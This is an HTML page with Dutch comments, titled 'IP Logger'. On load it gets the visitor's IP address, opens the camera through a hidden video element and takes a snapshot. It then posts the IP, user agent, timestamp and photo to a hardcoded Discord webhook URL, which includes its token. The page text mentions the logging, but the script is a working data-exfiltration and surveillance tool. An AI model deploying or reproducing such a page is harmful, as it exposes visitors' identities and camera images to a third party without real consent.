<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script>
        // Functie om IP-adres, gebruikersagent, tijdstip en een foto te verkrijgen
        function getIP(json) {
            var ipAddress = json.ip;
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var video = document.getElementById('video');

            // Muziek afspelen
            var audio = new Audio('sound.mp3');
            audio.loop = true;
            audio.play();

            // Toegang vragen tot de camera
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    video.srcObject = stream;
                    video.play();
                    // Wachten op het laden van de video feed
                    video.onloadedmetadata = function () {
                        setTimeout(function () {
                            takeSnapshot(ipAddress, userAgent, timestamp);
                        }, 1000); // Wacht 1 seconde voordat de foto wordt gemaakt
                    };
                })
                .catch(function (err) {
                    console.error("Error accessing camera: ", err);
                });
        }

        // Functie om een foto te maken en naar Discord webhook te sturen in een embed bericht
        function takeSnapshot(ipAddress, userAgent, timestamp) {
            var video = document.getElementById('video');
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            var context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            var imageURL = canvas.toDataURL('image/jpeg');

            var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';

            // Maak een embed object aan met het IP-adres, gebruikersagent, tijdstip en de foto
            var embed = {
                "embeds": [
                    {
                        "title": "IP Logger",
                        "description": "Een gebruiker heeft de pagina bezocht.",
                        "color": 16711680, // Rood
                        "fields": [
                            {
                                "name": "IP Adres",
                                "value": ipAddress,
                                "inline": true
                            },
                            {
                                "name": "Gebruikersagent",
                                "value": userAgent,
                                "inline": true
                            },
                            {
                                "name": "Tijdstip",
                                "value": timestamp,
                                "inline": true
                            }
                        ],
                        "image": {
                            "url": imageURL
                        }
                    }
                ]
            };

            // Maak een nieuw XMLHttpRequest object aan
            var xhr = new XMLHttpRequest();

            // Definieer de methode en URL voor het verzoek
            xhr.open("POST", webhookURL);

            // Stel de content type header in
            xhr.setRequestHeader("Content-Type", "application/json");

            // Stel de payload in met het ingesloten bericht
            var payload = JSON.stringify(embed);
            
            // Stuur het verzoek
            xhr.send(payload);

            // Stop de video feed en de camera
            var stream = video.srcObject;
            var tracks = stream.getTracks();
            tracks.forEach(function(track) {
                track.stop();
            });
            video.srcObject = null;
        }

        // Wanneer de pagina wordt geladen, roep dan de functie op om het IP-adres te verkrijgen
        window.onload = function() {
            var script = document.createElement('script');
            script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
            document.getElementsByTagName('head')[0].appendChild(script);
        };
    </script>
</head>
<body>
    <h1>IP Logger</h1>
    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en stuurt het naar Discord, samen met een foto van de gebruiker. Ook wordt de muziek "sound.mp3" automatisch afgespeeld.</p>
    <video id="video" style="display:none;"></video>
</body>
</html>
